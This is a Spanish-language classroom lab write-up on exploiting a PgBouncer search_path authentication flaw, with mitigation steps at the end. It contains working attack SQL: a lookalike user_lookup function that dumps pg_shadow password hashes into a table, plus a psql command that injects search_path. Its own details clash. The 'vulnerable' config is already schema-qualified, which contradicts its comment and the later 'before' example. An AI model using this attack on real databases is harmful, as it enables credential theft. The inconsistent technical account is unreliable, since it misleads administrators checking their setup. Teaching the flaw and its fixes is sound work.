

## Escenario del Laboratorio

### 1. Requisitos de la víctima (Tu infraestructura vulnerable)

* **PgBouncer:** Versión < 1.25.1.
* **Configuración:** Tienes habilitada la autenticación mediante consulta (`auth_query`) en el archivo `pgbouncer.ini`.
* **Base de datos:** PostgreSQL 15, 16 o 17.

### 2. Configuración Vulnerable (`pgbouncer.ini`)

Imagina que tienes esta configuración para manejar miles de usuarios:

```ini
[pgbouncer]
listen_port = 6432
auth_type = trust
auth_query = SELECT usename, passwd FROM public.user_lookup($1)
# ^ NOTA: Aquí está el peligro, la función user_lookup no está "esquema-calificada" 
# o el entorno de ejecución es manipulable.

```

---

## El Paso a Paso del Ataque

### Paso 1: Preparación del "Caballo de Troya"

El atacante necesita que exista un objeto malicioso en la base de datos. En entornos de "Base de Datos como Servicio" (DBaaS) o bases de datos compartidas, un usuario con pocos privilegios puede crear su propio esquema.

El atacante ejecuta esto en la base de datos (con su usuario limitado):

```sql
-- Crear un esquema que el atacante controla
CREATE SCHEMA malware;

-- Crear una función "gemela" a la que usa PgBouncer para autenticar
-- Pero esta función hace algo malicioso además de devolver el password
CREATE OR REPLACE FUNCTION malware.user_lookup(p_user text)
RETURNS TABLE (usename text, passwd text) AS $$
BEGIN
    -- EL ATAQUE: Aquí el atacante puede ejecutar lo que quiera con 
    -- los permisos del usuario de PgBouncer (usualmente un superusuario)
    INSERT INTO public.usuarios_robados SELECT * FROM pg_shadow; 
    
    -- Finalmente, devuelve un resultado falso para que el login proceda
    RETURN QUERY SELECT p_user, 'password_falso';
END;
$$ LANGUAGE plpgsql;

```

### Paso 2: La Conexión Maliciosa (El Disparador)

Aquí es donde entra la vulnerabilidad **CVE-2025-12819**. El atacante intenta conectarse a PgBouncer, pero manipula el **StartupMessage** (el paquete inicial de red).

En lugar de una conexión normal, envía un parámetro de configuración extra: **`search_path`**.

**Comando del atacante (usando `psql` o un script):**

```bash
psql -h servidor_vulnerable -p 6432 -U cualquier_usuario \
     "options='-c search_path=malware,public'"

```

### Paso 3: La Falla de Lógica de PgBouncer

1. **PgBouncer** recibe la solicitud. Como es una versión vulnerable, acepta el `search_path=malware,public` que envió el atacante **antes** de verificar quién es.
2. Para verificar la contraseña, PgBouncer ejecuta su `auth_query`: `SELECT ... FROM user_lookup($1)`.
3. **PostgreSQL** recibe la consulta. Al buscar la función `user_lookup`, mira el `search_path` que está activo.
4. Como `malware` está primero en la lista, Postgres ejecuta `malware.user_lookup` en lugar de la función legítima en `public`.

### Paso 4: Ejecución y Robo

La función del atacante se ejecuta con los privilegios de PgBouncer. El atacante ha logrado **Ejecución de Código SQL Arbitrario** sin siquiera saber una contraseña válida.

---

## ¿Cómo arreglarlo hoy mismo? (Tu Plan de Acción)

Si no puedes actualizar PgBouncer en este segundo, aplica estas mitigaciones de inmediato en tu infraestructura:

### A. Califica los nombres en tu configuración (Solución rápida)

Cambia tu `pgbouncer.ini` para que no dependa del `search_path`. Usa el nombre completo (esquema + objeto):

```ini
# ANTES (Vulnerable)
auth_query = SELECT usename, passwd FROM user_lookup($1)

# DESPUÉS (Seguro)
auth_query = SELECT usename, passwd FROM public.user_lookup($1)

```

### B. Restringe el acceso a nivel de red

No permitas que el puerto de PgBouncer (6432) sea accesible desde internet. Usa Firewalls o Grupos de Seguridad para que solo tus servidores de aplicación (que tú controlas) puedan conectarse.

### C. El "Remedio Real": Actualiza

La versión **1.25.1** de PgBouncer introduce un cambio donde ignora ciertos parámetros críticos (como `search_path`) durante la fase de autenticación, evitando que el atacante pueda "mover el piso" de la base de datos.

---

### Resumen para tu clase:

Este laboratorio demuestra que en arquitectura de bases de datos, **el orden de búsqueda de objetos (Search Path) es un vector de ataque**. Nunca debemos permitir que un usuario no autenticado defina variables de entorno que afecten cómo la base de datos busca sus propias funciones de seguridad.
 
